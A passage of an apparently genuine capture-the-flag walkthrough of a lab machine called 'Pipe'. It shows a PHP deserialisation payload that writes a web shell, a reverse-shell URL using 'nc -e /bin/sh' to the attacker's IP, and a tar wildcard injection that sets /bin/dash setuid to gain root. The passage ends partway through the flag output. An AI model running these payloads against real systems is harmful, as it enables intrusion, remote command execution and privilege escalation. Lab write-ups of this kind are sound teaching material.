</span><span class='line'><span class="k">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">({</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">firstname</span><span class="o">:</span> <span class="s1">&#39;Rene&#39;</span><span class="p">,</span> <span class="nx">surname</span><span class="o">:</span> <span class="s1">&#39;Margitte&#39;</span><span class="p">,</span> <span class="nx">artwork</span><span class="o">:</span> <span class="s1">&#39;The Treachery of Images&#39;</span><span class="p">});</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="nx">object</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nx">object</span><span class="o">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;{&quot;</span><span class="p">),</span><span class="nx">object</span><span class="o">.</span><span class="nx">length</span><span class="p">);</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="s2">&quot;O:4:</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">:4:&quot;</span> <span class="o">+</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">param</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;info_form&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;&lt;</span><span class="nx">i</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">i</span><span class="o">&gt;&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">hr</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">From</span> <span class="nx">Wikipedia</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">free</span> <span class="nx">encyclopedia</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span> <span class="p">(</span><span class="nx">French</span><span class="o">:</span> <span class="nx">La</span> <span class="nx">trahison</span> <span class="nx">des</span> <span class="nx">images</span><span class="p">,</span> <span class="mi">1928</span><span class="nx">–29</span><span class="p">,</span> <span class="nx">sometimes</span> <span class="nx">translated</span> <span class="k">as</span> <span class="nx">The</span> <span class="nx">Treason</span> <span class="nx">of</span> <span class="nx">Images</span><span class="p">)</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">painting</span> <span class="nx">by</span> <span class="nx">the</span> <span class="nx">Belgian</span> <span class="nx">surrealist</span> <span class="nx">painter</span> <span class="nx">René</span> <span class="nx">Magritte</span><span class="p">,</span> <span class="nx">painted</span> <span class="nx">when</span> <span class="nx">Magritte</span> <span class="nx">was</span> <span class="mi">30</span> <span class="nx">years</span> <span class="nx">old</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">picture</span> <span class="nx">shows</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Below</span> <span class="nx">it</span><span class="p">,</span> <span class="nx">Magritte</span> <span class="nx">painted</span><span class="p">,</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe.&quot;</span> <span class="p">[</span><span class="nx">sə</span><span class="o">.</span><span class="nx">si</span> <span class="nx">ne</span> <span class="nx">paz‿yn</span> <span class="nx">pip</span><span class="p">],</span> <span class="nx">French</span> <span class="k">for</span> <span class="s2">&quot;This is not a pipe.&quot;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="s2">&quot;The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it&#39;s just a representation, is it not? So if I had written on my picture &#39;This is a pipe&#39;, I&#39;d have been lying!&quot;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="nx">His</span> <span class="nx">statement</span> <span class="nx">is</span> <span class="nx">taken</span> <span class="nx">to</span> <span class="nx">mean</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">painting</span> <span class="nx">itself</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">merely</span> <span class="nx">an</span> <span class="nx">image</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Hence</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">description</span><span class="p">,</span> <span class="s2">&quot;this is not a pipe.&quot;</span> <span class="nx">The</span> <span class="nx">theme</span> <span class="nx">of</span> <span class="nx">pipes</span> <span class="nx">with</span> <span class="nx">the</span> <span class="nx">text</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe&quot;</span> <span class="nx">is</span> <span class="nx">extended</span> <span class="nx">in</span> <span class="nx">his</span> <span class="mi">1966</span> <span class="nx">painting</span><span class="p">,</span> <span class="nx">Les</span> <span class="nx">Deux</span> <span class="nx">Mystères</span><span class="o">.</span> <span class="nx">It</span> <span class="nx">is</span> <span class="nx">currently</span> <span class="nx">on</span> <span class="nx">display</span> <span class="nx">at</span> <span class="nx">the</span> <span class="nx">Los</span> <span class="nx">Angeles</span> <span class="nx">County</span> <span class="nx">Museum</span> <span class="nx">of</span> <span class="nx">Art</span><span class="o">.</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">sometimes</span> <span class="nx">given</span> <span class="k">as</span> <span class="nx">an</span> <span class="nx">example</span> <span class="nx">of</span> <span class="nx">meta</span> <span class="nx">message</span> <span class="nx">conveyed</span> <span class="nx">by</span> <span class="nx">paralanguage</span><span class="o">.</span> <span class="nx">Compare</span> <span class="nx">with</span> <span class="nx">Korzybski</span><span class="err">&#39;</span><span class="nx">s</span> <span class="s2">&quot;The word is not the thing&quot;</span> <span class="k">and</span> <span class="s2">&quot;The map is not the territory&quot;</span><span class="o">.</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;width:500px;overflow:hidden;&quot;</span> <span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;images/pipe.jpg&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;400px&quot;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&quot;auto&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span><span class="o">&gt;</span><span class="nx">Show</span> <span class="nx">Artist</span> <span class="nx">Info</span><span class="o">.&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>It loads <code>scriptz/php.js</code> and there is a link pointing to function <code>submit_form</code> with a hidden value <code>param</code>, then I use burp proxy to check what data will be sent when I click the link <code>Show Artist Info</code>, after URL decoded, I found the following data:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:4:&ldquo;Info&rdquo;:4:{s:2:&ldquo;id&rdquo;;i:1;s:9:&ldquo;firstname&rdquo;;s:4:&ldquo;Rene&rdquo;;s:7:&ldquo;surname&rdquo;;s:8:&ldquo;Margitte&rdquo;;s:7:&ldquo;artwork&rdquo;;s:23:&ldquo;The Treachery of Images&rdquo;;}</span></code></pre></td></tr></table></div></figure></p>

<p>After a close look at the source code in <code>php.js</code>, <code>Log.php.BAK</code> and <code>index.php</code>, I can manage to construct the following payload to upload a web shell:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:3:&ldquo;Log&rdquo;:2:{s:8:&ldquo;filename&rdquo;;s:31:&ldquo;/var/www/html/scriptz/shell.php&rdquo;;s:4:&ldquo;data&rdquo;;s:30:&ldquo;&lt;\?php system($_GET[&lsquo;cmd&rsquo;]); \?>&rdquo;;}</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/pipe/2.png"></p>

<p>Here we can see that <code>shell.php</code> has been created under folder <code>scriptz</code> and now we can run system commands.</p>

<p>The following URL will give us a reverse shell connect back to attacker&rsquo;s port 4444</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://10.1.1.143/scriptz/shell.php?cmd=nc+-e+/bin/sh+10.1.1.130+4444">http://10.1.1.143/scriptz/shell.php?cmd=nc+-e+/bin/sh+10.1.1.130+4444&lt;/a></span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/the_pipe# nc -lvnp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>connect to [10.1.1.130] from (UNKNOWN) [10.1.1.143] 33575
</span><span class='line'>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>pwd
</span><span class='line'>/var/www/html/scriptz
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 .
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   94 Jul  9 13:51 .htaccess
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  474 Jul  6 02:26 log.php.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data 3768 Jul  5 19:02 php.js
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   35 Nov 22 07:20 shell.php</span></code></pre></td></tr></table></div></figure></p>

<p>Then using python to jail break the shell and start enumerating</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;);&rdquo;
</span><span class='line'>www-data@pipe:/var/www/html/scriptz$cd ..
</span><span class='line'>www-data@pipe:/var/www/html$ ls -al&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 36
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 .
</span><span class='line'>drwxr-xr-x 3 root     root     4096 Jul  5 14:46 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  137 Jul  6 02:43 .htaccess
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   43 Jul  6 09:33 .htpasswd
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Jul  6 02:53 images
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data 2801 Jul  9 13:49 index.php
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  150 Jul  6 01:50 info.php
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data  474 Jul  6 03:43 log.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 scriptz
</span><span class='line'>www-data@pipe:/var/www/html$ cat  .htpasswd&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ ls  -al&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 24
</span><span class='line'>drwxr-xr-x 3 rene rene 4096 Jul  6 07:42 .
</span><span class='line'>drwxr-xr-x 3 root root 4096 Jul  5 14:09 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene  220 Jul  5 14:09 .bash_logout
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 3515 Jul  5 14:09 .bashrc
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene  675 Jul  5 14:09 .profile
</span><span class='line'>drwxrwxrwx 2 rene rene 4096 Nov 22 07:38 backup
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 140
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:38 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>total 156
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:39 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 13451 Nov 22 07:39 sys-17501.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK</span></code></pre></td></tr></table></div></figure></p>

<p>Here we noticed that system doing backup automatically, so I go to check cron entry in <code>/etc/crontab</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ cat  /etc/crontab&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>/etc/crontab: system-wide crontab&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>Unlike any other crontab you don&rsquo;t have to run the `crontab'&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>command to install the new version when you edit this file&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>and files in /etc/cron.d. These files also have username fields,&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>that none of the other crontabs do.&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>SHELL=/bin/sh
</span><span class='line'>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>m h dom mon dow user  command&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>17 *    * * *   root    cd / &amp;&amp; run-parts &ndash;report /etc/cron.hourly
</span><span class='line'>25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.daily )
</span><span class='line'>47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.weekly )
</span><span class='line'>52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts &ndash;report /etc/cron.monthly )
</span><span class='line'>#
</span><span class='line'>* * * * * root /root/create_backup.sh
</span><span class='line'>*/5 * * * * root /usr/bin/compress.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Trying to check the script code in both <code>.sh</code> file, but only <code>/usr/bin/compress.sh</code> can be read:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ cat /usr/bin/compress.sh
</span><span class='line'>cat /usr/bin/compress.sh&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>!/bin/sh&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>rm -f /home/rene/backup/backup.tar.gz
</span><span class='line'>cd /home/rene/backup
</span><span class='line'>tar cfz /home/rene/backup/backup.tar.gz *
</span><span class='line'>chown rene:rene /home/rene/backup/backup.tar.gz
</span><span class='line'>rm -f /home/rene/backup/*.BAK</span></code></pre></td></tr></table></div></figure></p>

<p>Here I noticed that <code>tar</code> is used with wildcard <code>*</code>, which can be exploited to execute arbitrary commands. <a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt" title="Wildcards exploit">Here</a> is the details about Unix wildcard exploit, the relevant information about <code>tar</code> can be found in point 4.3.</p>

<p>I will use setuid a shell command to get a ROOT shell, first of all, I have to check what kind of shell installed in the server.:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ ls -al /bin/&lt;em>sh
</span><span class='line'>ls -al /bin/&lt;/em>sh
</span><span class='line'>-rwxr-xr-x 1 root root 1029624 Nov 13  2014 /bin/bash
</span><span class='line'>-rwxr-xr-x 1 root root  125400 Nov  8  2014 /bin/dash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov 13  2014 /bin/rbash -> bash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov  8  2014 /bin/sh -> dash</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, I found <code>/bin/dash</code> appeared in the list, now I am going to create evil script and ROOT it:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$cd /home/rene/backup
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > &ndash;checkpoint=1;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > &ndash;checkpoint-action=exec=sh\ shell.sh;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo &lsquo;chmod u+s /bin/dash&rsquo; > shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$echo &lsquo;touch /home/rene/backup/done&rsquo; >> shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$cat shell.sh
</span><span class='line'>chmod u+s /bin/dash
</span><span class='line'>touch /home/rene/backup/done
</span><span class='line'>www-data@pipe:/home/rene/backup$chmod +x shell.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Now just waiting for couple of minutes and you will find that a new file named <code>done</code> has been created.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -al
</span><span class='line'>total 44
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data     1 Nov 22 08:07 &ndash;checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data     1 Nov 22 08:07 &ndash;checkpoint=1
</span><span class='line'>drwxrwxrwx 2 rene     rene      4096 Nov 24 05:40 .
</span><span class='line'>drwxr-xr-x 3 rene     rene      4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r&ndash;r&ndash; 1 rene     rene     20927 Nov 24 05:40 backup.tar.gz
</span><span class='line'>-rw-r&ndash;r&ndash; 1 root     root         0 Nov 24 05:40 done
</span><span class='line'>-rwxr-xr-x 1 www-data www-data    49 Nov 23 07:03 shell.sh</span></code></pre></td></tr></table></div></figure></p>

<p>Now it is ready to run <code>/bin/dash</code> and enjoy the ROOT!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ /bin/dash
</span><span class='line'>/bin/dash&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>id&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>whoami&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>whoami
</span><span class='line'>root&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>ls -al /root&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>ls -al /root
</span><span class='line'>total 28
</span><span class='line'>drwx&mdash;&mdash;  2 root root 4096 Jul  9 13:53 .
</span><span class='line'>drwxr-xr-x 22 root root 4096 Jul  5 14:01 ..
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  5 14:12 .bash_history -> /dev/null
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  570 Jan 31  2010 .bashrc
</span><span class='line'>lrwxrwxrwx  1 root root    9 Jul  9 13:53 .nano_history -> /dev/null
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  140 Nov 20  2007 .profile
</span><span class='line'>-rwx&mdash;&mdash;  1 root root  120 Jul  6 08:59 create_backup.sh
</span><span class='line'>-rw&mdash;&mdash;-  1 root root 4251 Jul  6 10:41 flag.txt&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>cat /root/flag.txt&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>cat /root/flag.txt
</span><span class='line'>                                                                   .aMMMMMMMMn.  ,aMMMMn.
</span><span class='line'>                                                                 .aMccccccccc&lt;em>YMMn.    &lt;code>Mb
</span><span class='line'>                                                                aMccccccccccccccc*Mn    MP
